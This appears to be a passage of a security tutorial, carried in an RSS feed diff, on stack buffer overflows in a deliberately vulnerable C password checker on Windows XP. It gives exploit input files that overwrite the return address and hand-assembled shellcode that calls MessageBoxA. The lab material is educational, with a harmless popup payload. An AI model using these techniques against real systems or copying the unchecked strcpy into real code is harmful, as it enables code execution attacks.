+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fscanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">valid_flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ERROR!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;OK!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="analysis-expstd0102">Analysis (ExpStd0102)&lt;/h5>
+&lt;blockquote>
+&lt;p>first use a known address for shellcode, this address is compiled differently by different compilers and loaded differently by different systems, so it can only be used for testing&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>Necessary information
+&lt;ul>
+&lt;li>Success branch address: &lt;code>0x0040111F&lt;/code>&lt;/li>
+&lt;li>Since memory is stored in reverse order, these values should be written in reverse order&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Edit password.txt in hexadecimal as follows&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1F&lt;/span> &lt;span class="mi">11&lt;/span> &lt;span class="mi">40&lt;/span> &lt;span class="mo">00&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Run the program, at this point
+&lt;ul>
+&lt;li>The stack address &lt;code>0x0012FB24&lt;/code> holds the return address of the function &lt;code>verify_password&lt;/code>.&lt;/li>
+&lt;li>This has been flushed to &lt;code>0040111F&lt;/code>, which is the success branch address&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>The success branch address is used instead of the return address, but the program crashes after displaying success because the stack is not balanced&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h4 id="added-attack-load-shellcode">added attack load (ShellCode)&lt;/h4>
+&lt;p>Increase the size of the buffer to carry the attack load&lt;br>
+Dynamically load DLL for API calls&lt;/p>
+&lt;h5 id="code-expstd0103">code (ExpStd0103)&lt;/h5>
+&lt;blockquote>
+&lt;p>Compile environment: Windows XP SP3, Visual C++ 6, Debug&lt;br>
+Experimental environment: Windows XP SP3&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define PASSWORD &amp;#34;1234567&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">44&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">authenticated&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PASSWORD&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">fp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">LoadLibrary&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;user32.dll&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;password.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;rw+&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fscanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">valid_flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ERROR!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;OK!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="analysis-expstd0103">Analysis (ExpStd0103)&lt;/h5>
+&lt;blockquote>
+&lt;p>Objective: To implant code to implement a popup MessageBox during program validation&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>Necessary information
+&lt;ul>
+&lt;li>Array start address: &lt;code>0x0012FAF0&lt;/code> (also the start address of ShellCode execution)&lt;/li>
+&lt;li>MessageBoxA address: &lt;code>0x77D507EC&lt;/code>&lt;/li>
+&lt;li>Hexadecimal text: &lt;code>4D6F656F6D75&lt;/code> (Moeomuoo)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>The machine code composed of&lt;/li>
+&lt;/ul>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Machine code(HEX)&lt;/th>
+&lt;th>Assembly code&lt;/th>
+&lt;th>Comments&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>33DB&lt;/td>
+&lt;td>XOR EBX, EBX&lt;/td>
+&lt;td>Clear EBX to ensure there are no zeros in ShellCode (as of character)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>53&lt;/td>
+&lt;td>PUSH EBX&lt;/td>
+&lt;td>\0` at the end of the string&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>68 6D756F6F&lt;/td>
+&lt;td>PUSH 6F6F756D&lt;/td>
+&lt;td>Press in text byte muoo(0x6D756F6F)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>68 4D6F656F&lt;/td>
+&lt;td>PUSH 6F656F4D&lt;/td>
+&lt;td>press in text byte moeo(0x4D6F656F)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>8BC4&lt;/td>
+&lt;td>MOV EAX, ESP&lt;/td>
+&lt;td>ESP stack top point to string Moeomuoo, hand over to EAX&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>53&lt;/td>
+&lt;td>PUSH EBX&lt;/td>
+&lt;td>MB_OK&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>50&lt;/td>
+&lt;td>PUSH EAX&lt;/td>
+&lt;td>Message&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>50&lt;/td>
+&lt;td>PUSH EAX&lt;/td>
+&lt;td>Caption&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>53&lt;/td>
+&lt;td>PUSH EBX&lt;/td>
+&lt;td>Handle&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>B8 EC07D577&lt;/td>
+&lt;td>MOV EAX, 0x77D507EC&lt;/td>
+&lt;td>Hard-code MessageBoxA&amp;rsquo;s address into EAX&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>FFD0&lt;/td>
+&lt;td>CALL EAX&lt;/td>
+&lt;td>Call MessageBoxA&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;ul>
+&lt;li>Write the machine code to password.txt in order
+&lt;ul>
+&lt;li>Bytes 53-56 are filled with the return address (the start address of the Buffer), and the rest of the bytes are filled with 0x90&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>The only imperfection is that the program crashes and quits&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>Here is the final password.txt&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="mi">33&lt;/span> &lt;span class="n">DB&lt;/span> &lt;span class="mi">53&lt;/span> &lt;span class="mi">68&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="n">D&lt;/span> &lt;span class="mi">75&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mi">68&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="n">D&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mi">65&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="n">B&lt;/span> &lt;span class="n">C4&lt;/span> &lt;span class="mi">53&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">50&lt;/span> &lt;span class="mi">50&lt;/span> &lt;span class="mi">53&lt;/span> &lt;span class="n">B8&lt;/span> &lt;span class="n">EC&lt;/span> &lt;span class="mo">07&lt;/span> &lt;span class="n">D5&lt;/span> &lt;span class="mi">77&lt;/span> &lt;span class="n">FF&lt;/span> &lt;span class="n">D0&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="n">F0&lt;/span> &lt;span class="n">FA&lt;/span> &lt;span class="mi">12&lt;/span> &lt;span class="mo">00&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>This article discusses how to exploit buffer overflow vulnerabilities and the writing of ShellCode, but the shortcomings are hard-coded addresses and stack space shifts&lt;br>
+These issues are discussed in the next article&lt;/p></description></item></channel></rss>
